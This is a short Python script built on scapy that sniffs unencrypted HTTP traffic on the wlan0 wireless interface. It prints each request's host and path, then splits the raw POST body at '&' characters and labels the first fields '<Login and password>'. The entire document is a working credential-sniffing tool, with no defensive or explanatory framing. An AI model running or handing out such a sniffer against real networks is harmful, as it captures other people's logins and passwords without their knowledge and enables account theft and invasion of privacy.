#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(inteface):
    scapy.sniff(iface=inteface, store=False, prn=process)
def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
def process(packet):
     if packet.haslayer(http.HTTPRequest):
          print(packet.show())
          url = get_url(packet)
          print(" HTTP Request >> " + str(url))
          if packet.haslayer(scapy.Raw):
             email = (packet[scapy.Raw].load)
             string = str(email, encoding='utf-8')
             k = 0;
             a = ""
             for element in string:
                 if element == "&":
                     k = k + 1
                     a = a + "\n"
                     if k == 2:
                         break
                     else:
                         print("\n")
                 else:

                     a = a + element

             print("<Login and password>\n" + str(a))


sniff("wlan0")